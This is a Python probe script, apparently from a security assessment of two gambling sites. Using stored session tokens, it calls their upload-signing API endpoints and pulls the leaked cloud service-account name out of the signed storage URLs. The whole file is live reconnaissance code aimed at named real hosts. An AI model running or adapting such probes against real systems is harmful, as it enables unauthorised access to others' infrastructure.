#!/usr/bin/env python3
"""probe_sign_url_upload.py — Confirm sign-url-upload-slip + sign-url-upload-message params.

Both endpoints accept: {filename, content_type, size}
Both return signed GCS URLs leaking z-seamless-service-account (F30).

Confirmed params:
  POST /mb/sign-url-upload-slip    → pcdn.i-gamingplatform.com/{TID}/deposit_slip/{uuid}.jfif
  POST /mb/sign-url-upload-message → pcdn.i-gamingplatform.com/{TID}/message_images/{uuid}.jfif

check-upload-match-slip: POST returns 400 ISE for all params.
  Requires pending slip deposit context which doesn't exist (no platform bank accounts).
  Both tenants (we88c, vak88z2) have empty payment-bank-information templates.
"""
import requests, json, time

JPEG = bytes([
    0xff,0xd8,0xff,0xe0,0x00,0x10,0x4a,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,
    0x00,0x01,0x00,0x00,0xff,0xdb,0x00,0x43,0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,
    0x07,0x07,0x07,0x09,0x09,0x08,0x0a,0x0c,0x14,0x0d,0x0c,0x0b,0x0b,0x0c,0x19,0x12,
    0x13,0x0f,0x14,0x1d,0x1a,0x1f,0x1e,0x1d,0x1a,0x1c,0x1c,0x20,0x24,0x2e,0x27,0x20,
    0x22,0x2c,0x23,0x1c,0x1c,0x28,0x37,0x29,0x2c,0x30,0x31,0x34,0x34,0x34,0x1f,0x27,
    0x39,0x3d,0x38,0x32,0x3c,0x2e,0x33,0x34,0x32,0xff,0xc0,0x00,0x0b,0x08,0x00,0x01,
    0x00,0x01,0x01,0x01,0x11,0x00,0xff,0xc4,0x00,0x1f,0x00,0x00,0x01,0x05,0x01,0x01,
    0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,
    0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0xff,0xda,0x00,0x08,0x01,0x01,0x00,0x00,0x3f,
    0x00,0xfb,0xd7,0xff,0xd9
])

TID_WE  = "54ef7626cb381f4bab8be91f0cdbce47"
TID_VAK = "af6efb584a3d317b5a11ab6209b88e1b"

def mgapi(tid): return f"https://{tid}mgapi.asdgapicenterssdo.com"
def hdrs(tid, jwt):
    domain = "we88c.com" if "54ef" in tid else "vak88z2.com"
    return {"Authorization": f"Bearer {jwt}", "template": "vn",
            "Content-Type": "application/json", "Origin": f"https://m.{domain}"}

jwt_we  = open(".jwt.we88c").read().strip()
jwt_vak = open(".jwt.vak88z2").read().strip()

PARAMS = {"filename": "slip.jpg", "content_type": "image/jpeg", "size": len(JPEG)}

print("=" * 60)
print("F30 — GCS Signed URL Exposure via sign-url-upload-*")
print("=" * 60)

for label, tid, jwt, endpoint in [
    ("we88c  slip   ", TID_WE,  jwt_we,  "/mb/sign-url-upload-slip"),
    ("we88c  message", TID_WE,  jwt_we,  "/mb/sign-url-upload-message"),
    ("vak88z2 slip  ", TID_VAK, jwt_vak, "/mb/sign-url-upload-slip"),
    ("vak88z2 msg   ", TID_VAK, jwt_vak, "/mb/sign-url-upload-message"),
]:
    r = requests.post(f"{mgapi(tid)}{endpoint}", headers=hdrs(tid, jwt),
                      json=PARAMS, timeout=15)
    if r.status_code == 200:
        url = r.json().get("urlUpload", "")
        import urllib.parse
        path = urllib.parse.urlparse(url).path
        print(f"\n[OK] {label} {endpoint}")
        print(f"     Path: {path}")
        print(f"     SA:   {urllib.parse.urlparse(url).query.split('GoogleAccessId=')[1].split('&')[0] if 'GoogleAccessId=' in url else 'N/A'}")
    else:
        print(f"\n[FAIL] {label}: {r.status_code} {r.text[:100]}")

print("\n" + "=" * 60)
print("check-upload-match-slip — STATUS: ALWAYS 400 ISE")
print("Reason: No pending slip deposits on either tenant")
print("  Both tenants: payment-bank-information returns empty template")
print("  Platform bank accounts deactivated → auto-slip-deposit silently dropped")
print("=" * 60)
